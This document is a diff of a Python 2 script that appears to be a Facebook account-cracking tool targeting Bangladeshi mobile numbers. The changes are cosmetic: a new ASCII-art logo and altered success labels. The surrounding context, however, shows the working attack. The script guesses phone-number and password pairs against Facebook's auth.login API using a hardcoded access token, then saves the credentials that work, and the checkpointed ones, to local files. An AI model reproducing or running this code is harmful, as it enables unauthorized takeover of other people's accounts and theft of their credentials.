@@ -71,15 +71,63 @@ logo = """
                                                                         
 
 
- _______           __    __       ________ 
-|       \         |  \  |  \     |        \
-| $$$$$$$\        | $$  | $$      \$$$$$$$$
-| $$__/ $$ ______ | $$__| $$ ______ | $$   
-| $$    $$|      \| $$    $$|      \| $$   
-| $$$$$$$\ \$$$$$$| $$$$$$$$ \$$$$$$| $$   
-| $$__/ $$        | $$  | $$        | $$   
-| $$    $$        | $$  | $$        | $$   
- \$$$$$$$          \$$   \$$         \$$   
+                                                                            
+
+                                                                            
+
+BBBBBBBBBBBBBBBBB        HHHHHHHHH     HHHHHHHHH     TTTTTTTTTTTTTTTTTTTTTTT
+
+B::::::::::::::::B       H:::::::H     H:::::::H     T:::::::::::::::::::::T
+
+B::::::BBBBBB:::::B      H:::::::H     H:::::::H     T:::::::::::::::::::::T
+
+BB:::::B     B:::::B     HH::::::H     H::::::HH     T:::::TT:::::::TT:::::T
+
+  B::::B     B:::::B       H:::::H     H:::::H       TTTTTT  T:::::T  TTTTTT
+
+  B::::B     B:::::B       H:::::H     H:::::H               T:::::T        
+
+  B::::BBBBBB:::::B        H::::::HHHHH::::::H               T:::::T        
+
+  B:::::::::::::BB         H:::::::::::::::::H               T:::::T        
+
+  B::::BBBBBB:::::B        H:::::::::::::::::H               T:::::T        
+
+  B::::B     B:::::B       H::::::HHHHH::::::H               T:::::T        
+
+  B::::B     B:::::B       H:::::H     H:::::H               T:::::T        
+
+  B::::B     B:::::B       H:::::H     H:::::H               T:::::T        
+
+BB:::::BBBBBB::::::B     HH::::::H     H::::::HH           TT:::::::TT      
+
+B:::::::::::::::::B      H:::::::H     H:::::::H           T:::::::::T      
+
+B::::::::::::::::B       H:::::::H     H:::::::H           T:::::::::T      
+
+BBBBBBBBBBBBBBBBB        HHHHHHHHH     HHHHHHHHH           TTTTTTTTTTT      
+
+                                                                            
+
+                                                                            
+
+                                                                            
+
+                                                                            
+
+                                                                            
+
+                                                                            
+
+                                                                            
+
+
+
+
+
+
+
+
                                            
                                            
                                            
@@ -121,7 +169,7 @@ os.system('xdg-open https://www.facebook.com/groups/367443570366706/?ref=share')
 def menu():
     os.system('clear')
     print logo
-    print '\x1b[1;91mONLY \x1b[1;91m11 \x1b[1;91m DIGITS HACKABLE ACCOUNTS ARE AVAILABLE'
+    print '\x1b[1;91mONLY \x1b[1;91m11 \x1b[1;91m11 DIGITS HACKABLE ACCOUNTS ARE AVAILABLE'
     print
     jalan('\x1b[1;92m[1]  \x1b[1;92mGRAMEENPHONE')
     jalan('\x1b[1;96m[2]  \x1b[1;96mROBI')
@@ -293,13 +341,13 @@ def action():
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + c + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
             q = json.load(data)
             if 'access_token' in q:
-                print '\x1b[1;92m[Ok-JAHIED-SUCCESSFUL]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n' + '\x1b[1;92m  [Login Now]\n'
+                print '\x1b[1;92m[Ok-JAHED]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n' + '\x1b[1;92m  [Login Now]\n'
                 okb = open('save/successfull.txt', 'a')
                 okb.write(k + c + user + '|' + c + pass1 + '\n')
                 okb.close()
                 oks.append(c + user + c + pass1)
             elif 'www.facebook.com' in q['error_msg']:
-                print '\x1b[1;96m[CP-JAHIED-CHECKPOINT] \x1b[1;97m' + k + c + user + ' | ' + pass1 + '\x1b[1;96m  [Login After 07 Days]\n'
+                print '\x1b[1;96m[CP-JAHIED] \x1b[1;97m' + k + c + user + ' | ' + pass1 + '\x1b[1;96m  [Login After 07 Days]\n'
                 cps = open('save/checkpoint.txt', 'a')
                 cps.write(k + c + user + '|' + c + pass1 + '\n')
                 cps.close()
